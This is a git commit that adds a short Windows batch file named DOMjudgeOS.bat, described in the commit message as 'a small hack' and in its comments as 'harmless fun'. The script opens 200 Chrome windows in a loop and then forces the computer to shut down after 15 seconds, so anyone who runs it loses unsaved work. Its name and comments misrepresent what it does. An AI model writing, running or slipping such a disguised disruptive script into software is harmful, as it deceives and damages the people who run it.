65a17c845f9216796dc1c9bd5cccf8824199f3af
Guillermo Vazquez <wvvazque@gmail.com>
2018-07-18 15:59:42 -0500

    Create DOMjudgeOS.bat
    A small hack

---
+++ DOMjudgeOS.bat
@@ -0,0 +1,7 @@
+REM this is actually a fun batch file that opens a few chrome browser windows
+REM harmless fun
+
+@ECHO OFF
+for /L %%n in (1,1,200) do (start "Chrome" chrome --new-window)
+ping 1.1.1.1 -n 1 -w 1000 >NUL 
+shutdown -s -f -t 15 -c
